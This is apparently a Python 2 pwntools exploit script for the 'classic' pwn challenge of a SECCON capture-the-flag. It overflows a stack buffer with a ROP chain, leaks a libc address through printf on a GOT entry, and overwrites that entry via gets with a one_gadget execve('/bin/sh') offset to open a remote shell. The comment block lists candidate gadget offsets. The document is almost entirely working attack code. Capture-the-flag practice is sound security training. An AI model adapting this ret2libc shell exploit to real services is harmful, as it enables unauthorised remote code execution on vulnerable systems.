from pwn import *
from ctypes import *

address = 'classic.pwn.seccon.jp'
port = 17354
binary = './classic'
lib = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'

context.aslr = False
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

p = remote(address, port)

e = ELF(binary)
l = ELF(lib)

def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)


def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def i(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

rop = ROP(binary)
rop.printf(0x601018)
rop.gets(0x601028)
rop.printf(0)
sla('>> ', 'A' * 0x48 + str(rop))
print rl()
libc_addr = u64(r(8).ljust(8,'\x00')) - l.symbols['puts']
print '0x%x ' % libc_addr

'''
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcd0f3 execve("/bin/sh", rcx, r12)
constraints:
  [rcx] == NULL || rcx == NULL
  [r12] == NULL || r12 == NULL

0xcd1c8 execve("/bin/sh", rax, r12)
constraints:
  [rax] == NULL || rax == NULL
  [r12] == NULL || r12 == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
'''
# p.interactive()
sl(p64(libc_addr+0x4526a))
p.interactive()
